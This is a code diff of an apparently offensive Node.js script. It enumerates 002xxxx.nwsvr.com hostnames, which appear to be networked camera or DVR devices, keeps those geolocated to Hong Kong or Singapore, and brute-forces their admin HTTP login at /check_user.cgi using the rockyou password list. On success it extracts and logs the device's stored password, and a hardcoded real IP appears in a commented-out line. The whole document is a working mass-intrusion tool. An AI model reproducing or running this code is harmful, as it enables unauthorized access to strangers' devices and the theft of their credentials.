@@ -24,8 +24,9 @@ var logger = new (winston.Logger)({
 });
 
 var pwArray = [];
+var conn = 0;
 
-var s = fs.createReadStream('./passwords.txt')
+var s = fs.createReadStream('./rockyou.txt')
 	.pipe(es.split())
 	.pipe(es.mapSync(function(line){
 		s.pause();
@@ -37,17 +38,22 @@ var s = fs.createReadStream('./passwords.txt')
 	})
 	.on('end', function(){
 		console.log('Read file end, start spider');
-		//startSpider();
-		login('138.19.85.253','http://138.19.85.253');
+		startSpider();
+		//login('138.19.85.253','http://138.19.85.253');
 	})
 );
 
 
 function startSpider() {
-	for(a=116 ; a<117 ; a++) {
-		for(b=97 ; b<97 ; b++) {
+	for(a=117 ; a<118 ; a++) {
+		for(b=97 ; b<123 ; b++) {
 			for(c=97 ; c<123 ; c++) {
 				for(d=97 ; d<123 ; d++) {
+					
+					while(conn > 100) {
+						sleep.usleep(100000);
+					}
+
 					var url = 'http://002' + String.fromCharCode(a,b,c,d) + '.nwsvr.com';
 					getLink(url);
 					sleep.usleep(500);
@@ -81,6 +87,7 @@ function checkCountry(url,link) {
         try{
             if((payload.country_code == 'HK') || (payload.country_code == 'SG')) {
 			    login(url,link); 
+				conn++;
             }   
         }
         catch(err) {}
@@ -90,52 +97,57 @@ function checkCountry(url,link) {
 }
 
 function login(url,link) {
-	finish = false;
-	pwInd = 0;
-	//do {
-		function login2() {
 
-			pw = pwArray[pwInd];
-			tmpLink = 'http://admin:'+pw+'@' + link.substr(7) + '/check_user.cgi';
+	pw = pwArray[0];
 
-			//console.log(tmpLink);
-			request({url: tmpLink}, function (error, response, body) {
-				if (!error && response.statusCode == 200) {
-					console.log(url + " password found : " + pw);
-					finish = true;
-				} else if(!error && response.statusCode == 401) {
-					console.log(url + " incorrect pw : " + pw);
+	tmpLink = 'http://admin:'+pw+'@' + link.substr(7) + '/check_user.cgi';
 
-					sleep.usleep(1000);
-					
-					pwInd++;
+	//console.log(tmpLink);
+	request({url: tmpLink}, function (error, response, body) {
+	
+		body = ''+body; 	
+		body = body.substring(body.indexOf('pwd=\'')+5);
+		body = body.substring(0,body.indexOf('\';'));
+	
+		if (!error && response.statusCode == 200) {
+			console.log(url + " password found : " + body);
+			conn--;
+		} else if(!error && response.statusCode == 401) {
+			relogin(url,link,1,0);
+		} else {
+			relogin(url,link,1,1);
+		}
+	});
+}
 
-					try {
-					login2();
-					} catch(e) {}
-				} else {
-					//console.log('Error : '+error + ' link : ' + link);
-					try{
-					if(error.indexOf("Invalid URL") == -1) {
-					}
-					} catch(e) {}
+function relogin(url,link,pwInd,errCount) {
 
-                    sleep.usleep(1000);
+	//console.log(url + " relogin pwInd : " + pwInd + " errCount : "+errCount);
 
-					try{
-                    login2();
-					} catch(e) {}
+	sleep.usleep(500000);
 
-				}		
-			});
-		}		
-		try {
-		login2();
-		} catch(e) {}
+    pw = pwArray[pwInd];
 
+    tmpLink = 'http://admin:'+pw+'@' + link.substr(7) + '/check_user.cgi';
 
-		//sleep.usleep(10000);	
-		//pwInd++;
-	//} while((!finish) && (pwInd < pwArray.length))
+    request({url: tmpLink}, function (error, response, body) {
+
+		body = ''+body;
+        body = body.substring(body.indexOf('pwd=\'')+5);
+        body = body.substring(0,body.indexOf('\';'));
+
+		if (!error && response.statusCode == 200) {
+			console.log(url + " relogin password found : " + body);
+	        conn--;
+		} else if(pwInd >= pwArray.length) {
+			conn--;
+	    } else if(!error && response.statusCode == 401) {
+		    relogin(url,link,pwInd+1,0);
+	    } else {
+			if(errCount < 10) {
+				relogin(url,link,pwInd+1,errCount+1);
+			}
+	    }
+	});
 }
 
